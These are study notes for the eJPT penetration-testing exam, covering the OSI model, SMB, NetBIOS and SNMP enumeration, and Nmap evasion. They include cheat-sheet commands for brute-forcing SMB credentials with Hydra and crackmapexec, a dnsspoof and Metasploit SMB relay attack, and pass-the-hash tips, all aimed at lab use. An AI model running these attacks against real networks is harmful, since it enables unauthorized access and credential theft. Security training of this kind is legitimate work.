## 🌐 1. Networking Fundamentals

### Network Protocols
- Hosts communicate with each other through **network protocols**
- Protocols ensure interoperability between different hardware/software systems
- Communication is transferred via **packets**

### Packets
- Packets = streams of bits running as electrical signals on physical media (Ethernet, Wi-Fi)
- Every packet has two parts:
  - **Header** — protocol-specific structure that enables the receiver to interpret the payload
  - **Payload** — the actual data (e.g., part of an email, file content)

### The OSI Model

| # | Layer | Function | Examples |
|---|-------|----------|---------|
| 7 | Application | Network services to end-users | HTTP, FTP, SSH, DNS |
| 6 | Presentation | Data format translation, encryption, compression | SSL/TLS, JPEG, IMAP |
| 5 | Session | Manages sessions, synchronization, dialog control | APIs, NetBIOS, RPC |
| 4 | Transport | End-to-end communication, flow control | TCP, UDP |
| 3 | Network | Logical addressing and routing | IP, ICMP, IPSec |
| 2 | Data Link | Physical addressing, framing, error detection | Ethernet, PPP, Switches |
| 1 | Physical | Physical connection between devices | USB, Ethernet cables, Fiber, Hubs |

> ⚠️ The OSI model is a **reference model**, not a strict implementation blueprint.

> 💡 **Community Exam Tip:** Know which OSI layer each protocol operates at — OSI model questions frequently appear on the eJPT exam. Memorise the layers top-to-bottom: *All People Seem To Need Data Processing*.

---

## 🧱 2. Penetration Testing Methodology

```
Information Gathering → Enumeration → Exploitation → Post-Exploitation → Reporting
```

| Phase | Sub-tasks |
|-------|-----------|
| **Info Gathering** | OSINT, Network Mapping, Host Discovery, Port Scanning, OS/Service Detection |
| **Enumeration** | Service Enumeration, User Enumeration, Share Enumeration |
| **Exploitation** | Vulnerability Analysis, Developing/Modifying Exploits, Service Exploitation |
| **Post-Exploitation** | Local Enumeration, Privilege Escalation, Credential Access, Persistence, Lateral Movement |
| **Reporting** | Report Writing, Recommendations |

---

## 🔍 3. Introduction to Enumeration

- Enumeration follows host discovery and port scanning
- Goal: gather **detailed information** about hosts/services — accounts, shares, misconfigurations
- Involves **active connections** to remote devices
- Many protocols can be targeted if misconfigured or left enabled

> 💡 **Community Exam Tip:** Always enumerate thoroughly before jumping to exploitation. Nmap scripts (`-sC` or `--script`) are your best friend. Missing an open port or service is a common mistake on the eJPT exam.

---

## 🗂️ 4. SMB & NetBIOS Enumeration

### NetBIOS (Network Basic Input/Output System)
- API + set of protocols for communication over a local network
- Allows applications on different computers to find and interact
- **Three primary services:**
  - **Name Service (NetBIOS-NS)** — register/unregister/resolve names → Port **137**
  - **Datagram Service (NetBIOS-DGM)** — connectionless/broadcast → Port **138**
  - **Session Service (NetBIOS-SSN)** — connection-oriented, reliable transfers → Port **139**

### SMB (Server Message Block)
- Protocol for **file sharing, printer sharing, named pipes, IPC** on Windows networks
- Allows accessing remote files as if they were local
- **Versions:**
  - SMB 1.0 — original, **security vulnerabilities**, used with Windows XP
  - SMB 2.0/2.1 — Windows Vista/Server 2008, improved performance & security
  - SMB 3.0+ — Windows 8/Server 2012, adds encryption, multichannel, virtualisation support
- **Ports:**
  - Port **445** — direct SMB traffic (bypassing NetBIOS)
  - Port **139** — SMB over NetBIOS

> Modern Windows uses SMB primarily; NetBIOS over TCP 139 is kept for **backward compatibility**

### SMB Enumeration Commands (from community cheat sheets)

```bash
# Basic Nmap SMB scan
nmap -sV -sC -p 445 <TARGET_IP>
sudo nmap -p 445 -sV -sC -O <TARGET_IP>

# Nmap SMB scripts
nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>
nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-domains --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

# SMB client enumeration
smbclient -L \\\\<TARGET_IP>\\ -U <USER>
smbclient \\\\<TARGET_IP>\\<SHARE> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>

# Brute-force SMB credentials
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
crackmapexec smb <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Metasploit SMB modules
msf> use auxiliary/scanner/smb/smb_version
msf> use auxiliary/scanner/smb/smb_enumusers
msf> use auxiliary/scanner/smb/smb_enumshares
msf> use auxiliary/scanner/smb/smb_login
```

> 💡 **Community Exam Tips:**
> - Always check SMB version — SMBv1 is the most vulnerable and commonly targeted on the eJPT
> - Use `enum4linux` for a comprehensive dump of SMB information (users, groups, shares, policies)
> - After getting credentials, try `smbmap` first to check share permissions before connecting
> - After brute-forcing SMB credentials, try **PsExec** via Metasploit (`exploit/windows/smb/psexec`) to get a shell
> - If you find NTLM hashes (e.g., in a leaked file), use `smb_login` with the hash file as `PASS_FILE` — pass-the-hash works here
> - Submit flags immediately — they can change after a lab reset

---

## 📡 5. SNMP Enumeration

### What is SNMP?
- **Simple Network Management Protocol** — monitors/manages networked devices (routers, switches, printers, servers)
- Application layer protocol, typically uses **UDP**
- **Three components:**
  - **SNMP Manager** — queries/interacts with agents
  - **SNMP Agent** — software on the device, responds to queries and sends traps
  - **MIB (Management Information Base)** — hierarchical database defining available data; each item has a unique **OID (Object Identifier)**

### SNMP Versions

| Version | Auth Method | Notes |
|---------|------------|-------|
| SNMPv1 | Community strings (passwords) | Earliest version, weakest |
| SNMPv2c | Community strings | Adds bulk transfer support |
| SNMPv3 | User-based auth + encryption | Most secure |

### Ports
- **Port 161 (UDP)** — SNMP queries
- **Port 162 (UDP)** — SNMP traps (notifications)

### What to Look For During SNMP Enumeration
- SNMP-enabled devices on the network
- System info: device names, OS, software versions, network interfaces
- **Community strings** (default: `public` for read, `private` for write)
- Routing tables, IP addresses, network configurations
- User accounts and group information
- Running services and applications

### SNMP Enumeration Commands (from community cheat sheets)

```bash
# Discover SNMP with Nmap
nmap -sU -sV -p 161 <TARGET_IP>

# List available SNMP scripts
ls -la /usr/share/nmap/scripts | grep -e "snmp-*"

# Brute-force community strings
nmap -sU -p 161 --script=snmp-brute <TARGET_IP>

# Run all SNMP scripts (dump all info)
nmap -sU -p 161 --script snmp-* <TARGET_IP> > snmp_info.txt

# Walk the SNMP tree (requires valid community string)
snmpwalk -v 1 -c public <TARGET_IP>
snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP>

# Output is not human-readable by default — pipe through MIB tools for clarity
```

> 💡 **Community Exam Tips:**
> - Always scan for SNMP with **UDP** (`-sU`) — many miss it by only scanning TCP
> - Default community string is almost always `public` — try it first before brute-forcing
> - `snmpwalk` output is cryptic OID data — look specifically for system users and process lists
> - After finding usernames via SNMP, use them to perform **brute-force attacks on SMB** via Hydra or Metasploit
> - After getting credentials, use **PsExec** or Metasploit's `psexec` module to access the system via SMB

---

## 🔄 6. SMB Relay Attack

### What Is It?
- An attacker **intercepts SMB traffic**, then **relays it** to a legitimate server to gain unauthorized access
- Common in Windows networks (file/printer sharing)
- Does **not** require cracking the NTLM hash — the hash is *relayed as-is*

### How It Works — Step by Step

| Step | Action |
|------|--------|
| 1. **Interception** | Attacker sets up MITM using ARP spoofing, DNS poisoning, or a rogue SMB server |
| 2. **Capture Auth** | Client sends SMB connection; attacker captures **NTLM hash** |
| 3. **Relay** | Attacker relays the NTLM hash to another trusted server (doesn't need to decrypt it) |
| 4. **Gain Access** | Attacker impersonates the user and accesses files, DBs, admin privileges → lateral movement |

### SMB Relay Attack Commands (from community cheat sheets)

```bash
# Step 1: Set up the DNS spoof file
echo "<KALI_IP> *.targetdomain.com" > dns_spoof.txt

# Step 2: Start DNS spoofing (intercept DNS queries on eth1)
dnsspoof -i eth1 -f dns_spoof.txt

# Step 3: Set up SMB Relay via Metasploit
msf> search smb_relay
msf> use exploit/windows/smb/smb_relay
msf> set SRVHOST <KALI_IP>
msf> set LHOST <KALI_IP>
msf> set SMBHOST <TARGET_IP>    # The server to relay to
msf> run

# The module grabs NTLM hashes from intercepted SMB connections
# and uses them to get a shell/meterpreter session on the target
```

> 💡 **Community Exam Tips:**
> - The SMB relay lab uses **DNS spoofing** to redirect victim SMB traffic to the attacker machine — understand the `dnsspoof` command and the DNS file format
> - Every time the victim (Windows 7) sends an SMB request, `dnsspoof` forges a reply pointing to the attacker's IP; Metasploit then grabs the NTLM hash and opens a session
> - SMB relay works best when SMB Signing is **disabled** on the target — check with `nmap --script smb-security-mode`
> - After a successful relay you can get a **meterpreter session** — from there, run post-exploitation modules

---

## 🛡️ 7. Firewall Detection & IDS Evasion

- Covered as a module in this course (demo-based)
- Key techniques (from Nmap capabilities):
  - **Decoy scans** (`-D`) — disguise scanner IP among decoys
  - **Fragmented packets** (`-f`) — split packets to evade signature detection
  - **Timing options** (`-T0` to `-T5`) — slow scans evade rate-based IDS
  - **Source port manipulation** (`--source-port 53`) — mimic trusted services
  - **Idle/zombie scan** (`-sI`) — use a zombie host to hide origin

> 💡 **Community Exam Tip:** For the eJPT, focus on Nmap timing (`-T2` or `-T3` for stealth) and understanding what filtered vs closed ports mean — useful for identifying firewall rules.

---

## 🗺️ Learning Objectives Summary

| Objective | Key Skill |
|-----------|-----------|
| Host Discovery & Port Scanning | Identify hosts, open ports, and services on Windows/Linux |
| Service Enumeration | Use Nmap scripts and protocol-specific tools (SMB, NetBIOS, SMTP, FTP) |
| MITM & Network Attacks | ARP Spoofing, DNS Spoofing, ARP Poisoning, NBT-NS Poisoning with `arpspoof`, `dnsspoof`, `Responder` |
| Exploitation | Exploit Windows/Linux protocols; perform SMB Relaying |
| Post-Exploitation | Local enum, privilege escalation, credential access, persistence, lateral movement |

---

## 🧰 Quick Tool Reference

| Tool | Use Case |
|------|----------|
| `nmap` | Host discovery, port scanning, service/OS detection, NSE scripts |
| `smbclient` | Connect to SMB shares, list/download files |
| `smbmap` | Check share permissions for a given user |
| `enum4linux` | Comprehensive SMB/NetBIOS enumeration |
| `hydra` | Brute-force credentials (SMB, FTP, SSH, etc.) |
| `crackmapexec` | SMB enumeration and credential testing |
| `snmpwalk` | Walk SNMP MIB tree and extract data |
| `dnsspoof` | Forge DNS replies for MITM positioning |
| `Responder` | NBT-NS/LLMNR poisoning and hash capture |
| `Metasploit` | `smb_relay`, `psexec`, `smb_login`, `smb_enumusers` |
| `Wireshark` | Packet capture and traffic analysis |

---

## ✅ General eJPT Exam Tips (from Community)

> The following tips have been compiled from exam write-ups and notes by people who have completed the eJPT.

- **Enumerate first, exploit second** — never rush past the enumeration phase
- **Document everything** — note IPs, open ports, services, and credentials as you go; use Obsidian, Notion, or OneNote
- **Scan UDP too** — SNMP on port 161 is UDP and is frequently missed
- **Try default credentials first** — `admin/admin`, `admin/password`, `public` (SNMP community string)
- **Know your Metasploit modules** — `smb_version`, `smb_enumusers`, `smb_login`, `psexec`, `smb_relay` are all exam-relevant
- **Pass-the-hash is valid** — if you find NTLM hashes (leaked or captured), try them directly in `smb_login` as the password
- **Flags change on reset** — submit flags immediately after finding them
- **SMB signing matters** — relay attacks only work when SMB signing is disabled; check with `smb-security-mode` Nmap script
- **Use exclusion method** on MCQ questions — identify the three wrong answers to find the right one
- **70% is the passing score** — you don't need to be perfect; prioritise the flags you're confident about
- **48 hours is plenty of time** — pace yourself; take breaks and revisit stuck challenges with fresh eyes
- **Hydra + rockyou for brute-forcing** is consistently recommended by exam takers
- **Use `dirbuster`** (not Metasploit's scanner) with `/usr/share/wordlists/dirb/common.txt` for web directory scanning
- **Be familiar with Drupal and WordPress attacks** — these appear in the exploitation phase

---

